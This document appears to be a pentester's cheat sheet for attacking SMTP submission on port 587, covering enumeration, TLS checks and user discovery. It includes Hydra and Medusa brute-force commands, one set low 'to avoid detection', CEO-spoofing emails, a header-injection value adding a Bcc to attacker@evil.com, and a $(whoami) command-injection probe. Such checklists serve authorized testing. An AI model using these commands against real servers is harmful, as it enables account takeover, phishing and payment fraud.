# SMTP SUBMISSION ENUMERATION (Port 587)

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p587 <IP>                              # Service/Version detection
nc -nv <IP> 587                                  # Manual banner grab
telnet <IP> 587                                  # Alternative banner grab

# Get SMTP banner
nc <IP> 587
# Server responds with: 220 mail.domain.com ESMTP
```

## STARTTLS TESTING
```bash
# Port 587 typically uses STARTTLS (not implicit SSL like 465)
openssl s_client -connect <IP>:587 -starttls smtp -crlf
openssl s_client -connect <IP>:587 -starttls smtp -crlf -quiet

# Test STARTTLS support
echo "EHLO test.com" | nc <IP> 587
# Look for: 250-STARTTLS in response
```

## SSL/TLS CERTIFICATE ENUMERATION (After STARTTLS)
```bash
# Get certificate details
openssl s_client -connect <IP>:587 -starttls smtp 2>/dev/null | openssl x509 -noout -text
openssl s_client -connect <IP>:587 -starttls smtp -showcerts 2>/dev/null

# Certificate subject/issuer
openssl s_client -connect <IP>:587 -starttls smtp 2>/dev/null | openssl x509 -noout -subject
openssl s_client -connect <IP>:587 -starttls smtp 2>/dev/null | openssl x509 -noout -issuer

# Check certificate SANs
openssl s_client -connect <IP>:587 -starttls smtp 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"
nmap -p587 --script ssl-cert <IP>
```

## SSL/TLS SECURITY TESTING
```bash
# Cipher suite enumeration
nmap --script ssl-enum-ciphers -p587 <IP>
sslscan <IP>:587
sslyze --starttls=smtp --regular <IP>:587

# SSL/TLS version testing
openssl s_client -ssl3 -connect <IP>:587 -starttls smtp        # SSLv3
openssl s_client -tls1 -connect <IP>:587 -starttls smtp        # TLS 1.0
openssl s_client -tls1_2 -connect <IP>:587 -starttls smtp      # TLS 1.2
openssl s_client -tls1_3 -connect <IP>:587 -starttls smtp      # TLS 1.3

# Comprehensive testing
testssl.sh --starttls smtp <IP>:587
testssl.sh --vulnerable --starttls smtp <IP>:587
```

## SMTP ENUMERATION
```bash
# Get SMTP capabilities
echo "EHLO test.com" | nc <IP> 587

# Nmap SMTP scripts
nmap -p587 --script smtp-commands <IP>           # Enumerate SMTP commands
nmap -p587 --script smtp-ntlm-info <IP>          # NTLM info disclosure
nmap -p587 --script smtp-capabilities <IP>       # Get capabilities
```

## MANUAL SMTP ENUMERATION
```bash
# Connect without TLS
nc <IP> 587
EHLO attacker.com                                # Extended HELLO
STARTTLS                                         # Upgrade to TLS
# Then switch to openssl

# Connect with STARTTLS
openssl s_client -connect <IP>:587 -starttls smtp -crlf -quiet
EHLO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<user@target.com>
DATA
Subject: Test
Test message
.
QUIT
```

## USER ENUMERATION
```bash
# VRFY command (verify user exists)
nc <IP> 587
VRFY admin
VRFY root
VRFY test

# EXPN command (expand mailing list)
nc <IP> 587
EXPN admin
EXPN users

# RCPT TO enumeration
nc <IP> 587
EHLO test
MAIL FROM:<test@test.com>
RCPT TO:<admin@domain.com>

# Nmap user enumeration
nmap -p587 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} <IP>

# smtp-user-enum tool
smtp-user-enum -M VRFY -U users.txt -t <IP> -p 587
smtp-user-enum -M EXPN -U users.txt -t <IP> -p 587
smtp-user-enum -M RCPT -U users.txt -t <IP> -p 587 -D domain.com
```

## NTLM INFORMATION DISCLOSURE
```bash
# Extract NTLM info (Windows domain, version, hostname)
nmap -p587 --script smtp-ntlm-info <IP>

# Manual NTLM auth
nc <IP> 587
EHLO test
AUTH NTLM
TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==
# Server responds with NTLM challenge containing system info
```

## AUTHENTICATION TESTING
```bash
# Check for AUTH methods
echo "EHLO test" | nc <IP> 587 | grep AUTH

# AUTH PLAIN (base64 encoded)
echo -ne '\0username\0password' | base64         # Generate auth string
nc <IP> 587
EHLO test
AUTH PLAIN AHVzZXJuYW1lAHBhc3N3b3Jk

# AUTH LOGIN (base64 encoded)
nc <IP> 587
EHLO test
AUTH LOGIN
dXNlcm5hbWU=                                    # base64(username)
cGFzc3dvcmQ=                                    # base64(password)

# With STARTTLS
openssl s_client -connect <IP>:587 -starttls smtp -crlf -quiet
EHLO test
AUTH LOGIN
$(echo -n 'user' | base64)
$(echo -n 'password' | base64)
```

## BRUTE FORCE ATTACKS
```bash
# Hydra
hydra -l user@domain.com -P passwords.txt -s 587 <IP> smtp
hydra -L users.txt -P passwords.txt -s 587 <IP> smtp
hydra -l admin -P passwords.txt -s 587 -t 2 <IP> smtp  # Low threads to avoid detection

# Medusa
medusa -h <IP> -n 587 -u user@domain.com -P passwords.txt -M smtp
```

## OPEN RELAY TESTING
```bash
# Test if server relays for external domains
nmap -p587 --script smtp-open-relay <IP>

# Manual open relay test (requires AUTH on port 587 usually)
nc <IP> 587
EHLO attacker.com
MAIL FROM:<external@attacker.com>
RCPT TO:<external@victim.com>
# Should fail without authentication (port 587 requires auth)
```

## SEND EMAIL VIA PORT 587
```bash
# Send email with swaks (requires authentication)
swaks --to victim@target.com --from attacker@test.com --server <IP>:587 --auth-user user --auth-password pass --tls

# Send email manually with authentication
openssl s_client -connect <IP>:587 -starttls smtp -crlf -quiet
EHLO attacker.com
AUTH LOGIN
dXNlcm5hbWU=                                    # base64(username)
cGFzc3dvcmQ=                                    # base64(password)
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@target.com>
DATA
From: Admin <admin@target.com>
To: Victim <victim@target.com>
Subject: Important Notice

This is a test email.
.
QUIT
```

## VULNERABILITY SCANNING
```bash
# SSL/TLS vulnerabilities (after STARTTLS)
nmap -p587 --script ssl-heartbleed <IP>
nmap -p587 --script ssl-poodle <IP>
nmap -p587 --script ssl-drown <IP>
testssl.sh --vulnerable --starttls smtp <IP>:587

# SMTP-specific vulnerabilities
searchsploit smtp
nmap -p587 --script vuln <IP>
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/smtp/smtp_version          # Version detection
use auxiliary/scanner/smtp/smtp_enum             # User enumeration
use auxiliary/scanner/smtp/smtp_relay            # Open relay check
use auxiliary/scanner/smtp/smtp_ntlm             # NTLM info disclosure
set RPORT 587
```

## SWAKS EXAMPLES
```bash
# Test connection with STARTTLS
swaks --to test@target.com --from test@attacker.com --server <IP>:587 --tls

# Test with authentication
swaks --to test@target.com --from test@attacker.com --server <IP>:587 --auth-user admin --auth-password pass --tls

# Send email with attachment
swaks --to victim@target.com --from admin@target.com --server <IP>:587 --auth-user user --auth-password pass --attach file.pdf --tls

# Email spoofing (if no SPF/DKIM/DMARC)
swaks --to victim@target.com --from ceo@target.com --server <IP>:587 --auth-user user --auth-password pass --body "Transfer money..." --tls
```

## COMMON MISCONFIGURATIONS
```
☐ Authentication not required                   # Should require AUTH on 587
☐ VRFY/EXPN commands enabled                    # User enumeration
☐ Weak SSL/TLS after STARTTLS                   # SSLv3, TLS 1.0, weak ciphers
☐ STARTTLS not enforced                         # Downgrade attacks possible
☐ NTLM authentication enabled                    # Info disclosure
☐ No rate limiting                               # Brute force attacks
☐ Verbose error messages                         # Information leakage
☐ No SPF/DKIM/DMARC                             # Email spoofing
☐ Weak authentication requirements              # Easy to brute force
☐ Certificate validation issues                  # MitM attacks
```

## QUICK WIN CHECKLIST
```
☐ Test if authentication is required
☐ Extract NTLM information (domain, version)
☐ Test VRFY/EXPN for user enumeration
☐ Check STARTTLS support and enforcement
☐ Test SSL/TLS configuration after STARTTLS
☐ Test for Heartbleed (OpenSSL < 1.0.1g)
☐ Check certificate SANs for domains
☐ Test for user enumeration via RCPT TO
☐ Brute force with common credentials
☐ Test email spoofing capability
☐ Check for verbose error messages
☐ Search for known SMTP vulnerabilities
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive SMTP submission scan
nmap -sV -p587 --script "smtp-* and ssl-*" -oA smtp_587_enum <IP>

# Quick SSL/TLS check (with STARTTLS)
testssl.sh --vulnerable --starttls smtp <IP>:587

# Quick user enumeration
smtp-user-enum -M VRFY -U users.txt -t <IP> -p 587
```

## ADVANCED TECHNIQUES
```bash
# Test STARTTLS stripping (downgrade attack)
# Attacker intercepts and removes STARTTLS capability

# Email header injection
swaks --to victim@target.com --from "admin@target.com\nBcc: attacker@evil.com" --server <IP>:587 --auth-user user --auth-password pass --tls

# Test for command injection
nc <IP> 587
EHLO test$(whoami)

# Check if plain text auth allowed before STARTTLS
nc <IP> 587
EHLO test
AUTH LOGIN
# Should fail or warn - AUTH should only be after STARTTLS

# Certificate validation bypass test
openssl s_client -connect <IP>:587 -starttls smtp -servername differenthost.com
```

## DIFFERENCES: Port 25 vs 587 vs 465
```
Port 25 (SMTP):
- Server-to-server mail relay
- Often no authentication required
- Plain text or opportunistic STARTTLS
- May be blocked by ISPs

Port 587 (Submission):
- Client-to-server mail submission
- Requires authentication
- STARTTLS mandatory (RFC 6409)
- Preferred for mail clients

Port 465 (SMTPS):
- Implicit SSL/TLS from start
- Deprecated but still widely used
- No STARTTLS needed
- Secure connection immediately
```
